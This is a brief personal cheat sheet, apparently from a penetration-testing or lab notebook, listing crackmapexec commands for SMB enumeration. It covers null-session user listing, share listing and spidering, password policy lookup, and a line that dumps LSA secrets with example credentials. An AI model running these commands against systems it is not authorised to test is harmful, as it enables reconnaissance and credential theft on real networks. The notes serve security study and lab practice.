---
title: "crackmapexec"
tags:
  - fetus
---
## installation:
```sh
apt install crackmapexec
```
## usage:
### smb enum: 
```sh
crackmapexec smb IP
```

```sh
crackmapexec smb IIP -u '' -p '' --users
```
- lists out user accounts and their description fields

```sh
crackmapexec --verbose smb 192.168.98.120 -u corpmngr -p "User4&*&*" --lsa
```
- dump LSA secrets 

```sh
crackmapexec smb 10.129.29.43 -u guest -p '' --shares
```
- lists out shares and their info much like smbmap 
	- need to include dummy uname or will give access denied error :v

```sh
crackmapexec smb 10.129.203.121 -u guest -p '' --spider SHARENAME --regex .
```
- lists out files and directories in a shared folder 
### password policy enum:
```sh
crackmapexec smb IP -u '' -p '' --pass-pol
```
